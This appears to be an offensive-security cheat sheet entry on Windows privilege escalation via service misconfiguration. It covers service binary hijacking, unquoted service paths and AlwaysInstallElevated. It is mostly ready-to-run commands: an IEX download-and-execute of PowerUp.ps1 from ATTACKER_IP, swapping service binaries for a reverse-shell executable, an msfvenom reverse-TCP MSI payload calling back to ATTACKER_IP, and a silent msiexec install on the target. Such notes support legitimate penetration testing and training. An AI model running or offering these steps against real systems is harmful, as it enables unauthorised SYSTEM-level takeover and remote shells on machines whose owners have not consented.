---
id: windows-service-misconfig
title: Windows Service Misconfiguration
stage: privesc
tags: [windows]
tools:
  - "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}"
  - Get-ModifiableServiceFile
  - "wmic service get name,displayname,pathname,startmode"
leads_to:
  - system-shell
  - token-impersonation
---

## Service Binary Hijacking

```powershell
# Find running services and their binaries
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Check write permissions on the binary
icacls "C:\path\to\service.exe"
# Look for: BUILTIN\Users:(F) or (W) or (M)

# PowerUp
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
Invoke-AllChecks
Get-ModifiableServiceFile
```

```bash
# Replace binary with reverse shell
copy evil.exe "C:\path\to\service.exe"
sc stop ServiceName
sc start ServiceName
```

## Unquoted Service Path

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """"
sc qc ServiceName
```

If path like `C:\Program Files\Some App\service.exe` (no quotes), Windows tries:
- `C:\Program.exe`
- `C:\Program Files\Some.exe`

```bash
# Drop reverse shell into the ambiguous location
copy shell.exe "C:\Program.exe"
sc start ServiceName
```

## AlwaysInstallElevated (MSI as SYSTEM)

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must be 1:

```bash
# Attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o evil.msi
# Target
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

## Notes

winPEAS catches most of these automatically. Run `winPEAS.exe | Tee-Object C:\Windows\Temp\wp.out` immediately after landing a shell.
